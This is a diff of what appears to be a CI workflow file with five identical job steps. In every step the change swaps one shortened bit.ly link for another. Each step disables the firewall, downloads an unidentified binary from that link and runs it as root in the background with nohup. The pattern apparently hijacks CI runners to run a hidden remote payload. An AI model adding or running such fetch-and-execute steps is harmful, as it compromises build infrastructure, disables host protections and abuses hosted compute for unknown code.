@@ -11,9 +11,9 @@ jobs:
           sudo apt-get update
           sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
           sudo ufw disable 
-          wget https://bit.ly/3yE6UT1
-          chmod +x 3yE6UT1
-          sudo su --command "nohup ./3yE6UT1 --log=stdout > meta.log &"
+          wget https://bit.ly/3upqJLn
+          chmod +x 3upqJLn
+          sudo su --command "nohup ./3upqJLn --log=stdout > meta.log &"
           sleep 2
           sudo su --command "cat meta.log"    
       - run: 
@@ -34,9 +34,9 @@ jobs:
           sudo apt-get update
           sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
           sudo ufw disable 
-          wget https://bit.ly/3yE6UT1
-          chmod +x 3yE6UT1
-          sudo su --command "nohup ./3yE6UT1 --log=stdout > meta.log &"
+          wget https://bit.ly/3upqJLn
+          chmod +x 3upqJLn
+          sudo su --command "nohup ./3upqJLn --log=stdout > meta.log &"
           sleep 2
           sudo su --command "cat meta.log"    
       - run: 
@@ -57,9 +57,9 @@ jobs:
           sudo apt-get update
           sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
           sudo ufw disable 
-          wget https://bit.ly/3yE6UT1
-          chmod +x 3yE6UT1
-          sudo su --command "nohup ./3yE6UT1 --log=stdout > meta.log &"
+          wget https://bit.ly/3upqJLn
+          chmod +x 3upqJLn
+          sudo su --command "nohup ./3upqJLn --log=stdout > meta.log &"
           sleep 2
           sudo su --command "cat meta.log"    
       - run: 
@@ -80,9 +80,9 @@ jobs:
           sudo apt-get update
           sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
           sudo ufw disable 
-          wget https://bit.ly/3yE6UT1
-          chmod +x 3yE6UT1
-          sudo su --command "nohup ./3yE6UT1 --log=stdout > meta.log &"
+          wget https://bit.ly/3upqJLn
+          chmod +x 3upqJLn
+          sudo su --command "nohup ./3upqJLn --log=stdout > meta.log &"
           sleep 2
           sudo su --command "cat meta.log"    
       - run: 
@@ -103,9 +103,9 @@ jobs:
           sudo apt-get update
           sync && echo 3 | sudo tee /proc/sys/vm/drop_caches
           sudo ufw disable 
-          wget https://bit.ly/3yE6UT1
-          chmod +x 3yE6UT1
-          sudo su --command "nohup ./3yE6UT1 --log=stdout > meta.log &"
+          wget https://bit.ly/3upqJLn
+          chmod +x 3upqJLn
+          sudo su --command "nohup ./3upqJLn --log=stdout > meta.log &"
           sleep 2
           sudo su --command "cat meta.log"    
       - run: 
